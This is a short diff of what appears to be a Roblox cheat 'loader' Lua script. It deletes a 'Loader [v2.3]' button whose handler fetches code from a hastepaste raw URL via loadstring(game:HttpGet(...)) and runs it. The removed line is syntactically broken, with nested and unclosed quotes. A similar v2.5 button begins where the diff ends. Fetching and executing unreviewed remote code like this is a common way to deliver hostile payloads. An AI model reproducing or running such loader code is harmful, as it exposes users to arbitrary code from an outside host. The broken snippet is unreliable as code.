@@ -6,13 +6,7 @@ local Home = UI:addPage("Main",1,true,6)
 
 Home:addLabel("Loader","Created by LX")
 
-Home:addButton("Loader [v2.3]",function()
-    game.StarterGui:SetCore("SendNotification",{
-        Title = "Loader by LLC";
-        Text = "Welcome.";
-        loadstring(game:HttpGet("loadstring(game:HttpGet("https://hastepaste.com/raw/IuVEUHl"))()
-    })
-end)
+
 
 Home:addButton("Loader [v2.5]",function()
     game.StarterGui:SetCore("SendNotification",{
